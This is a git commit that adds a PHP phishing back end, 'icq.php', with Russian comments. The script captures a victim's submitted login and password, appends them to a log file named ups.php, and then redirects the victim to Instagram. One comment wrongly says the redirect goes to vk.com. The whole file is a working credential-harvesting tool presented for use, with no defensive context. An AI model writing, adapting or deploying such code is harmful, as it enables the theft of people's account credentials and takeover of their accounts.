9aeb34dd4c9f7d3f1e01a1511d215b095555c113
bandera201 <65469742+bandera201@users.noreply.github.com>
2020-05-17 01:11:16 +0300

    Add files via upload

---
+++ hl=ru/icq.php
@@ -0,0 +1,15 @@
+<?
+
+$Login = $_POST[zabor]; // Логин  жертвы
+
+$Pass = $_POST['zena']; // Пароль жертвы
+
+$log = fopen("ups.php","a+"); //тут будут лежать пароли жертв
+
+fwrite($log,"<br> $Login:$Pass \n"); //производим запись в ups.php
+
+fclose($log); //закрывает ups.php
+
+echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://www.instagram.com/'></head></html>"; // перенаправляем жертву на http://vk.com
+
+?>
